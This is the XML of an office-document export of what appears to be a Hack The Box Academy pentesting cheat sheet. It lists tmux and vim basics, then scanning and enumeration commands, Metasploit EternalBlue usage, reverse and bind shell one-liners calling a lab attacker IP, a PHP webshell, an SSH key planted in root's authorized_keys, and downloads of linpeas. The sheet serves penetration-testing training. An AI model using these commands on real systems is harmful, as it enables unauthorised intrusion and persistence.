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SFMono-Regular" svg:font-family="SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace"/>
    <style:font-face style:name="neue-haas-unica" svg:font-family="neue-haas-unica, sans-serif"/>
  </office:font-face-decls>
  <office:automatic-styles>
    <style:style style:name="Table1" style:family="table">
      <style:table-properties style:width="4.3375in" table:align="center"/>
    </style:style>
    <style:style style:name="Table1.A" style:family="table-column">
      <style:table-column-properties style:column-width="1.6174in"/>
    </style:style>
    <style:style style:name="Table1.B" style:family="table-column">
      <style:table-column-properties style:column-width="2.7201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05pt solid #1a2332" fo:border-bottom="1.5pt solid #1a2332"/>
    </style:style>
    <style:style style:name="Table1.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding-left="0in" fo:padding-right="0in" fo:padding-top="0.0194in" fo:padding-bottom="0in" fo:border-left="none" fo:border-right="none" fo:border-top="0.05pt solid #1a2332" fo:border-bottom="none"/>
    </style:style>
    <style:style style:name="Table2" style:family="table">
      <style:table-properties style:width="6.6931in" table:align="center"/>
    </style:style>
    <style:style style:name="Table2.A" style:family="table-column">
      <style:table-column-properties style:column-width="3.6271in"/>
    </style:style>
    <style:style style:name="Table2.B" style:family="table-column">
      <style:table-column-properties style:column-width="3.066in"/>
    </style:style>
    <style:style style:name="Table2.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding-left="0in" fo:padding-right="0in" fo:padding-top="0.0194in" fo:padding-bottom="0.0194in" fo:border-left="none" fo:border-right="none" fo:border-top="0.05pt solid #1a2332" fo:border-bottom="1.5pt solid #1a2332"/>
    </style:style>
    <style:style style:name="Table2.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding-left="0in" fo:padding-right="0in" fo:padding-top="0.0194in" fo:padding-bottom="0in" fo:border-left="none" fo:border-right="none" fo:border-top="0.05pt solid #1a2332" fo:border-bottom="none"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:color="#cad2e2" loext:opacity="100%" fo:font-weight="bold" fo:background-color="#141d2b" loext:padding-left="0.0193in" loext:padding-right="0in" loext:padding-top="0.0193in" loext:padding-bottom="0.0193in" loext:border-left="0.06pt solid #1a2332" loext:border-right="none" loext:border-top="0.06pt solid #1a2332" loext:border-bottom="0.06pt solid #1a2332"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" fo:line-height="120%" fo:text-align="center" style:justify-single-word="false" fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cad2e2" loext:opacity="100%" style:font-name="neue-haas-unica" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="#141d2b" loext:padding-left="0.0193in" loext:padding-right="0in" loext:padding-top="0.0193in" loext:padding-bottom="0.0193in" loext:border-left="0.06pt solid #1a2332" loext:border-right="none" loext:border-top="0.06pt solid #1a2332" loext:border-bottom="0.06pt solid #1a2332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a4b1cd" loext:opacity="100%" style:font-name="neue-haas-unica" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" style:font-name-asian="neue-haas-unica" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="neue-haas-unica" style:font-size-complex="10.5pt" style:font-style-complex="normal" style:font-weight-complex="normal" loext:padding="0in" loext:border="non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>
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" fo:line-height="150%" fo:text-align="center" style:justify-single-word="false" fo:orphans="2" fo:widows="2"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#9fef00" loext:opacity="100%" style:font-name="SFMono-Regular" fo:font-size="9pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffffff" loext:opacity="100%" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="neue-haas-unica" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" style:text-blinking="false" fo:background-color="#1a2332" loext:char-shading-value="0" loext:padding-left="0.0193in" loext:padding-right="0in" loext:padding-top="0.0193in" loext:padding-bottom="0.0193in" loext:border-left="0.06pt solid #1a2332" loext:border-right="none" loext:border-top="0.06pt solid #1a2332" loext:border-bottom="0.06pt solid #1a2332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Basic Tools</text:h>
      <text:section text:style-name="Sect1" text:name="cheatSheetModal"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Table_20_Heading"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Command</text:span></text:span></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="Table1.A1" office:value-type="string">
                <text:p text:style-name="Table_20_Heading"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Description</text:span></text:span></text:p>
              </table:table-cell>
            </table:table-row>
          </table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">General</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="P4"/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sudo openvpn user.ovpn</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Connect to VPN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ifconfig</text:span></text:span>/<text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">ip a</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Show our IP address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netstat -rn</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Show networks accessible via the VPN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ssh user@10.10.10.10</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">SSH to a remote server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ftp 10.129.42.253</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">FTP to a remote server</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">tmux</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="P4"/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tmux</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Start tmux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ctrl+b</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">tmux: default prefix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prefix c</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">tmux: new window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prefix 1</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">tmux: switch to window (<text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">1</text:span></text:span>)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prefix shift+%</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">tmux: split pane vertically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prefix shift+"</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">tmux: split pane horizontally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prefix -&gt;</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">tmux: switch to the right pane</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Vim</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="P4"/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vim file</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: open <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">file</text:span></text:span> with vim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esc+i</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: enter <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">insert</text:span></text:span> mode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esc</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: back to <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">normal</text:span></text:span> mode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x</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Cut character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dw</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Cut word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dd</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Cut full line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yw</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Copy word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yy</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Copy full line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p</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Paste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:1</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Go to line number 1.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:w</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Write the file 'i.e. save'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:q</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Quit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:q!</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Quit without saving</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">:wq</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">vim: Write and quit</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table>
        <text:h text:style-name="P2" text:outline-level="2">Pentesting</text:h>
        <table:table table:name="Table2" table:style-name="Table2">
          <table:table-column table:style-name="Table2.A"/>
          <table:table-column table:style-name="Table2.B"/>
          <table:table-header-rows>
            <table:table-row>
              <table:table-cell table:style-name="Table2.A1" office:value-type="string">
                <text:p text:style-name="Table_20_Heading"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Command</text:span></text:span></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="Table2.A1" office:value-type="string">
                <text:p text:style-name="Table_20_Heading"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Description</text:span></text:span></text:p>
              </table:table-cell>
            </table:table-row>
          </table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Service Scanning</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="P4"/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nmap 10.129.42.253</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run nmap on an IP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nmap -sV -sC -p- 10.129.42.253</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run an nmap script scan on an IP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locate scripts/citrix</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">List various available nmap scripts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nmap --script smb-os-discovery.nse -p445 10.10.10.40</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run an nmap script on an IP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netcat 10.10.10.10 22</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Grab banner of an open port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mbclient -N -L \\\\10.129.42.253</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">List SMB Shares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mbclient \\\\10.129.42.253\\users</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Connect to an SMB share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nmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Scan SNMP on an IP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onesixtyone -c dict.txt 10.129.42.254</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Brute force SNMP secret string</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Web Enumeration</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="P4"/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gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run a directory scan on a website</text:p>
            </table:table-cell>
          </table:table-row>
          <text:soft-page-break/>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run a sub-domain scan on a website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curl -IL https://www.inlanefreight.com</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Grab website banner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whatweb 10.10.10.121</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">List details about the webserver/certificates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curl 10.10.10.121/robots.txt</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">List potential directories in <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">robots.txt</text:span></text:span>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ctrl+U</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">View page source (in Firefox)</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Public Exploits</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="P4"/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earchsploit openssh 7.2</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Search for public exploits for a web application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msfconsole</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Start the Metasploit Framework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earch exploit eternalblue</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Search for public exploits in MSF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use exploit/windows/smb/ms17_010_psexec</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Start using an MSF module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how options</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Show required options for an MSF module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et RHOSTS 10.10.10.40</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Set a value for an MSF module option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check</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Test if the target server is vulnerable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exploit</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">MSF: Run the exploit on the target server is vulnerable</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Using Shells</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="P4"/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nc -lvnp 1234</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Start a <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">nc</text:span></text:span> listener on a local port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bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Send a reverse shell from the remote server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rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Another command to send a reverse shell from the remote server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rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Start a bind shell on the remote server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nc 10.10.10.1 1234</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Connect to a bind shell started on the remote server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python -c 'import pty; pty.spawn("/bin/bash")'</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Upgrade shell TTY (1)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ctrl+z</text:span></text:span> then <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">stty raw -echo</text:span></text:span> then <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">fg</text:span></text:span> then <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">enter</text:span></text:span> twice</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Upgrade shell TTY (2)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echo "&lt;?php system(\$_GET['cmd']);?&gt;" &gt; /var/www/html/shell.php</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Create a webshell php file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curl http://SERVER_IP:PORT/shell.php?cmd=id</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Execute a command on an uploaded webshell</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Privilege Escalation</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="P4"/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./linpeas.sh</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">linpeas</text:span></text:span> script to enumerate remote server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udo -l</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">List available <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">sudo</text:span></text:span> privileges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udo -u user /bin/echo Hello World!</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Run a command with <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">sudo</text:span></text:span>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udo su -</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Switch to root user (if we have access to <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">sudo su</text:span></text:span>)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udo su user -</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Switch to a user (if we have access to <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">sudo su</text:span></text:span>)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sh-keygen -f key</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Create a new SSH key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echo "ssh-rsa AAAAB...SNIP...M= user@parrot" &gt;&gt; /root/.ssh/authorized_keys</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Add the generated public key to the user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sh root@10.10.10.10 -i key</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">SSH to the server with the generated private key</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Transferring Files</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="P4"/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python3 -m http.server 8000</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Start a local webserver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wget http://10.10.14.1:8000/linpeas.sh</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Download a file on the remote server from our local machine</text:p>
            </table:table-cell>
          </table:table-row>
          <text:soft-page-break/>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Download a file on the remote server from our local machine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scp linenum.sh user@remotehost:/tmp/linenum.sh</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Transfer a file to the remote server with <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">scp</text:span></text:span> (requires SSH access)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base64 shell -w 0</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Convert a file to <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">base64</text:span></text:span>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echo f0VMR...SNIO...InmDwU | base64 -d &gt; shell</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Convert a file from <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">base64</text:span></text:span> back to its orig</text:p>
            </table:table-cell>
          </table:table-row>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">md5sum shell</text:span></text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A2" office:value-type="string">
              <text:p text:style-name="Table_20_Contents">Check the file's <text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">md5sum</text:span></text:span> to ensure it converted correctly</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table>
        <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="https://academy.hackthebox.com/module/cheatsheet/77" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T3">Download Cheatsheet</text:span></text:a></text:p>
      </text:section>
      <text:p text:style-name="P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SFMono-Regular" svg:font-family="SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace"/>
    <style:font-face style:name="neue-haas-unica" svg:font-family="neue-haas-unica, sans-serif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1.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
    <dc:date>2022-10-10T23:17:58.940771923</dc:date>
    <meta:editing-duration>PT4S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="2" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="162" meta:word-count="674" meta:character-count="4210" meta:non-whitespace-character-count="3699"/>
  </office:meta>
</office:document-meta>
</file>